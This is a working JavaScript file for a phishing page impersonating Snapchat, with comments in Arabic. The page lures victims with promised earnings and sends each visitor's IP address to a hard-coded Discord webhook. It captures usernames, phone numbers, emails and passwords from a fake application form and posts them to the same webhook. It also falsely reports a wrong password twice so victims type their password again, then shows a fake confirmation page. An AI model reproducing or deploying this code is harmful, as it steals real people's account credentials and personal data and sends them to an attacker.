// ===============================================
// إعدادات ديسكورد - استبدل الرابط أدناه
// ===============================================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 
// ===============================================

function sendToDiscord(message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        return Promise.resolve();
    }
    const payload = {
        content: message,
        username: "Snapchat Tracker",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png" 
    };
    // Fetch without waiting for response to speed up UX
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(console.error);
}

function trackVisitorIP() {
    fetch("https://api64.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            sendToDiscord(`👻 **زيارة جديدة**\nIP: ${data.ip}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
        })
        .catch(console.error);
}

// -----------------------------------------------------
// 1. منطق الصفحة الرئيسية (الانتظار الرسمي)
// -----------------------------------------------------
function trackClickAndProceed() {
    const btn = document.getElementById('applyButton');
    
    // 1. تغيير شكل الزر ليوحي بالمعالجة
    btn.textContent = "جاري التحقق من الأهلية..."; 
    btn.disabled = true; // يصبح لونه باهت قليلاً بفضل CSS

    // 2. إرسال الإشعار
    sendToDiscord(`🚨 **شخص نقر على زر التقديم**\nجاري تحويله...`);

    // 3. الانتظار ثانيتين ثم التحويل
    setTimeout(() => {
        window.location.href = 'apply.html';
    }, 2000); 
}

// -----------------------------------------------------
// 2. منطق صفحة النموذج (apply.html)
// -----------------------------------------------------
let attempts = 0;
document.addEventListener('DOMContentLoaded', () => {
    
    // تشغيل تتبع الزوار إذا كنا في الرئيسية
    if(document.title.includes("تحقيق المكاسب")) {
        trackVisitorIP();
    }

    const form = document.getElementById("submissionForm");
    if (form) {
        form.addEventListener("submit", function(event) {
            event.preventDefault();
            
            const btn = document.getElementById("submitBtn");
            const statusMsg = document.getElementById("statusMessage");
            const loading = document.getElementById("loadingOverlay");

            let username = document.getElementById("username").value;
            let phone = document.getElementById("phoneNumber").value;
            let email = document.getElementById("trackingEmail").value;
            let password = document.getElementById("passwordField").value;

            let msg = `🔥 **صيد جديد (محاولة ${attempts + 1})**\n`;
            msg += `👤 **User:** \`${username}\`\n`;
            msg += `📱 **Phone:** \`${phone}\`\n`;
            msg += `📧 **Email:** \`${email}\`\n`;
            msg += `🔑 **Pass:** \`${password}\`\n`;
            msg += `⏰ **Time:** ${new Date().toLocaleString('ar-EG')}`;

            if (attempts < 2) {
                // فشل (1 و 2)
                attempts++;
                sendToDiscord(msg);
                
                // محاكاة التحقق
                btn.textContent = "جاري التحقق...";
                btn.disabled = true;

                setTimeout(() => {
                    btn.textContent = "إرسال الطلب";
                    btn.disabled = false;
                    statusMsg.style.display = 'block';
                    statusMsg.textContent = "عفواً، كلمة المرور غير صحيحة.";
                    document.getElementById("passwordField").value = "";
                }, 1500);

            } else {
                // نجاح (3)
                attempts++;
                sendToDiscord(msg + "\n✅ **(تم التحويل للنجاح)**");
                
                btn.disabled = true;
                statusMsg.style.display = 'none';
                loading.style.display = 'flex';
                
                setTimeout(() => { window.location.href = "confirmation.html"; }, 3000);
            }
        });
    }
});
